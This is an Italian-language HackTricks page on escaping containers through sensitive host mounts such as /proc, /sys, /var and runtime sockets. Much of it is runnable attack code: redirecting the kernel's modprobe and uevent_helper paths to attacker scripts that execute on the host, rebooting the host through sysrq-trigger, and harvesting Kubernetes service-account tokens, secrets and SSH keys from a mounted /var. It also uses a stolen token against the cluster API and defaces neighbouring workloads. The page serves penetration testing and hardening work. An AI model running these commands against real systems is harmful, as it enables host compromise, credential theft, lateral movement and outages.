# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

I mount del host sono una delle superfici pratiche più importanti per un container-escape perché spesso riportano una vista di processo accuratamente isolata a una visibilità diretta delle risorse dell'host. I casi pericolosi non si limitano a `/`. Bind mounts di `/proc`, `/sys`, `/var`, socket di runtime, stato gestito da kubelet o percorsi relativi ai device possono esporre controlli del kernel, credenziali, filesystem di container vicini e interfacce di gestione del runtime.

Questa pagina esiste separatamente dalle singole pagine di protezione perché il modello di abuso è trasversale. Un host mount scrivibile è pericoloso in parte a causa dei mount namespaces, in parte a causa dei user namespaces, in parte a causa della copertura di AppArmor o SELinux, e in parte a causa del percorso esatto dell'host esposto. Trattarlo come argomento a sé rende la superficie d'attacco molto più semplice da ragionare.

## `/proc` Exposure

procfs contiene sia informazioni ordinarie sui processi sia interfacce di controllo del kernel ad alto impatto. Un bind mount come `-v /proc:/host/proc` o una vista del container che espone voci di proc inattese e scrivibili può quindi portare a disclosure di informazioni, denial of service o esecuzione diretta di codice sull'host.

I percorsi procfs ad alto valore includono:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Inizia verificando quali voci di procfs ad alto valore sono visibili o scrivibili:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Questi percorsi sono interessanti per motivi diversi. `core_pattern`, `modprobe`, e `binfmt_misc` possono diventare percorsi di esecuzione di codice sul host quando sono scrivibili. `kallsyms`, `kmsg`, `kcore`, e `config.gz` sono potenti fonti di ricognizione per lo sfruttamento del kernel. `sched_debug` e `mountinfo` rivelano il contesto di processi, cgroup e filesystem che può aiutare a ricostruire la disposizione dell'host dall'interno del container.

Il valore pratico di ciascun percorso è diverso, e trattarli tutti come se avessero lo stesso impatto rende il triage più difficile:

- `/proc/sys/kernel/core_pattern`
Se scrivibile, questo è uno dei percorsi procfs con il maggiore impatto perché il kernel eseguirà un pipe handler dopo un crash. Un container che può puntare `core_pattern` su un payload memorizzato nel suo overlay o in un percorso host montato può spesso ottenere l'esecuzione di codice sul host. Vedi anche [read-only-paths.md](protections/read-only-paths.md) per un esempio dedicato.
- `/proc/sys/kernel/modprobe`
Questo percorso controlla l'userspace helper utilizzato dal kernel quando deve invocare la logica di caricamento dei moduli. Se scrivibile dal container e interpretato nel contesto dell'host, può diventare un altro primitivo per l'esecuzione di codice sul host. È particolarmente interessante quando combinato con un modo per attivare il percorso dell'helper.
- `/proc/sys/vm/panic_on_oom`
Questo di solito non è un primitivo di escape pulito, ma può convertire la pressione di memoria in un denial-of-service a livello di host trasformando le condizioni OOM in comportamenti di kernel panic.
- `/proc/sys/fs/binfmt_misc`
Se l'interfaccia di registrazione è scrivibile, l'attaccante può registrare un handler per un valore magic scelto e ottenere l'esecuzione nel contesto dell'host quando viene eseguito un file corrispondente.
- `/proc/config.gz`
Utile per il triage di kernel exploit. Aiuta a determinare quali sottosistemi, mitigazioni e funzionalità opzionali del kernel sono abilitate senza bisogno dei metadata dei pacchetti dell'host.
- `/proc/sysrq-trigger`
Principalmente un percorso di denial-of-service, ma molto serio. Può riavviare, causare panic o interrompere immediatamente l'host.
- `/proc/kmsg`
Rivela i messaggi del ring buffer del kernel. Utile per host fingerprinting, analisi di crash e, in alcuni ambienti, per leaking informazioni utili allo sfruttamento del kernel.
- `/proc/kallsyms`
Prezioso se leggibile perché espone informazioni sui simboli del kernel esportati e può aiutare a sconfiggere le assunzioni di address randomization durante lo sviluppo di kernel exploit.
- `/proc/[pid]/mem`
Questa è un'interfaccia diretta alla memoria di processo. Se il processo target è raggiungibile con le condizioni di tipo ptrace necessarie, può permettere di leggere o modificare la memoria di un altro processo. L'impatto realistico dipende fortemente da credenziali, `hidepid`, Yama e dalle restrizioni ptrace, quindi è un percorso potente ma condizionato.
- `/proc/kcore`
Espone una vista in stile core-image della memoria di sistema. Il file è enorme e scomodo da usare, ma se è significativamente leggibile indica una superficie di memoria dell'host esposta in modo grave.
- `/proc/kmem` and `/proc/mem`
Storicamente interfacce di memoria raw ad alto impatto. Su molti sistemi moderni sono disabilitate o fortemente ristrette, ma se presenti e utilizzabili dovrebbero essere trattate come ritrovamenti critici.
- `/proc/sched_debug`
Leaks informazioni di scheduling e task che possono esporre le identità dei processi dell'host anche quando altre viste di processo appaiono più pulite del previsto.
- `/proc/[pid]/mountinfo`
Estremamente utile per ricostruire dove il container risiede realmente sull'host, quali percorsi sono overlay-backed, e se un mount scrivibile corrisponde a contenuto dell'host o solo allo layer del container.

Se `/proc/[pid]/mountinfo` o i dettagli dell'overlay sono leggibili, usali per recuperare il percorso host del filesystem del container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Questi comandi sono utili perché diverse tecniche di host-execution richiedono di trasformare un percorso all'interno del container nel corrispondente percorso dal punto di vista dell'host.

### Full Example: `modprobe` Helper Path Abuse

Se `/proc/sys/kernel/modprobe` è scrivibile dal container e il percorso del helper viene interpretato nel contesto dell'host, può essere reindirizzato a un payload controllato dall'attaccante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Il trigger esatto dipende dall'obiettivo e dal comportamento del kernel, ma il punto importante è che un percorso helper scrivibile può reindirizzare una futura invocazione dell'helper del kernel verso contenuti del percorso host controllati dall'attaccante.

### Esempio completo: Kernel Recon con `kallsyms`, `kmsg`, e `config.gz`

Se l'obiettivo è la valutazione della sfruttabilità piuttosto che l'evasione immediata:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Questi comandi aiutano a determinare se informazioni sui simboli utili sono visibili, se i messaggi recenti del kernel rivelano uno stato interessante e quali funzionalità o mitigazioni del kernel sono compilate. L'impatto di solito non è una fuga diretta, ma può ridurre drasticamente i tempi per il triage di vulnerabilità del kernel.

### Full Example: SysRq Host Reboot

Se `/proc/sysrq-trigger` è scrivibile e raggiunge la vista dell'host:
```bash
echo b > /proc/sysrq-trigger
```
L'effetto è il riavvio immediato dell'host. Questo non è un esempio sottile, ma dimostra chiaramente che l'esposizione di procfs può essere molto più grave di information disclosure.

## `/sys` Esposizione

sysfs espone grandi quantità di stato del kernel e dei dispositivi. Alcuni percorsi sysfs sono principalmente utili per fingerprinting, mentre altri possono influenzare l'esecuzione di helper, il comportamento dei dispositivi, la configurazione di security-module, o lo stato del firmware.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Questi percorsi sono rilevanti per ragioni diverse. `/sys/class/thermal` può influenzare la gestione termica e quindi la stabilità dell'host in ambienti esposti in modo inadeguato. `/sys/kernel/vmcoreinfo` può leak crash-dump e informazioni sul kernel-layout che aiutano nel fingerprinting dell'host a basso livello. `/sys/kernel/security` è l'interfaccia `securityfs` usata da Linux Security Modules, quindi un accesso imprevisto lì può esporre o alterare lo stato relativo a MAC. I percorsi delle variabili EFI possono influire sulle impostazioni di boot supportate dal firmware, rendendoli molto più seri dei normali file di configurazione. `debugfs` sotto `/sys/kernel/debug` è particolarmente pericoloso perché è intenzionalmente un'interfaccia orientata agli sviluppatori con aspettative di sicurezza molto inferiori rispetto alle hardened production-facing kernel APIs.

Comandi utili per esaminare questi percorsi sono:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Cosa rende interessanti quei comandi:

- `/sys/kernel/security` può rivelare se AppArmor, SELinux o un altro LSM è visibile in modo che avrebbe dovuto rimanere esclusivo dell'host.
- `/sys/kernel/debug` è spesso la scoperta più allarmante di questo gruppo. Se `debugfs` è montato e leggibile o scrivibile, aspettati una vasta superficie rivolta al kernel il cui rischio esatto dipende dai nodi di debug abilitati.
- L'esposizione delle variabili EFI è meno comune, ma se presente ha alto impatto perché riguarda impostazioni gestite dal firmware piuttosto che normali file di runtime.
- `/sys/class/thermal` è rilevante principalmente per la stabilità dell'host e l'interazione hardware, non per una fuga in stile shell particolarmente utile.
- `/sys/kernel/vmcoreinfo` è principalmente una fonte per il fingerprinting dell'host e l'analisi dei crash, utile per comprendere lo stato a basso livello del kernel.

### Esempio completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` è scrivibile, il kernel può eseguire un helper controllato dall'attaccante quando viene attivato un `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Il motivo per cui questo funziona è che il percorso dell'helper viene interpretato dal punto di vista dell'host. Una volta attivato, l'helper viene eseguito nel contesto dell'host invece che all'interno del container corrente.

## Esposizione di `/var`

Montare il `/var` dell'host in un container è spesso sottovalutato perché non sembra drammatico come montare `/`. In pratica può essere sufficiente per raggiungere socket di runtime, directory di snapshot dei container, volumi dei pod gestiti da kubelet, projected service-account tokens e i filesystem delle applicazioni vicine. Sui nodi moderni, `/var` è spesso dove risiede lo stato dei container più interessante dal punto di vista operativo.

### Esempio Kubernetes

Un pod con `hostPath: /var` spesso può leggere i token proiettati di altri pod e il contenuto degli snapshot overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Questi comandi sono utili perché indicano se la mount espone soltanto dati applicativi poco sensibili o credenziali del cluster ad alto impatto. Un service-account token leggibile può trasformare immediatamente l'esecuzione di codice locale in accesso all'API di Kubernetes.

Se il token è presente, verifica cosa può raggiungere invece di fermarti alla sola scoperta del token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
L'impatto qui può essere molto più esteso dell'accesso al nodo locale. Un token con ampi privilegi RBAC può trasformare un `/var` montato in un compromesso a livello di cluster.

### Esempio su Docker e containerd

Sui host Docker i dati rilevanti si trovano spesso sotto `/var/lib/docker`, mentre sui nodi Kubernetes basati su containerd possono trovarsi sotto `/var/lib/containerd` o in percorsi specifici dello snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Se il mount di `/var` espone contenuti di snapshot scrivibili di un altro workload, l'attaccante potrebbe essere in grado di alterare file dell'applicazione, inserire contenuti web o modificare script di avvio senza toccare la configurazione corrente del container.

Possibili abusi concreti una volta individuati contenuti di snapshot scrivibili:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Questi comandi sono utili perché mostrano le tre principali famiglie di impatto di `/var` montato: manomissione delle applicazioni, recupero di segreti e movimento laterale verso carichi di lavoro adiacenti.

## Socket di runtime

I mount sensibili dell'host spesso includono socket di runtime anziché directory complete. Sono così importanti che meritano di essere ribaditi esplicitamente qui:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Vedi [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) per i full exploitation flows una volta che uno di questi sockets è montato.

Come primo pattern di interazione rapido:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Se uno di questi ha successo, il percorso da "mounted socket" a "start a more privileged sibling container" è solitamente molto più breve di qualsiasi percorso di kernel breakout.

## Mount-Related CVEs

I mount sull'host intersecano anche vulnerabilità del runtime. Esempi recenti importanti includono:

- `CVE-2024-21626` in `runc`, dove un leaked file descriptor di una directory potrebbe posizionare la working directory sul filesystem dell'host.
- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit, dove race nella copy-up di OverlayFS potrebbero produrre scritture su percorsi dell'host durante le build.
- `CVE-2024-1753` in Buildah and Podman build flows, dove bind mount appositamente creati durante la build potrebbero esporre `/` in lettura-scrittura.
- `CVE-2024-40635` in containerd, dove un valore `User` molto grande potrebbe trasbordare e comportarsi come UID 0.

Questi CVE sono rilevanti qui perché dimostrano che la gestione dei mount non riguarda solo la configurazione dell'operatore. Anche il runtime stesso può introdurre condizioni di escape guidate dai mount.

## Controlli

Usa questi comandi per individuare rapidamente le esposizioni di mount di maggior valore:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Root dell'host, `/proc`, `/sys`, `/var` e socket di runtime sono tutte segnalazioni ad alta priorità.
- Voci proc/sys scrivibili spesso indicano che il mount sta esponendo controlli del kernel a livello host anziché una vista sicura del container.
- I percorsi `/var` montati meritano una revisione delle credenziali e dei carichi di lavoro adiacenti, non solo del filesystem.
{{#include ../../../banners/hacktricks-training.md}}
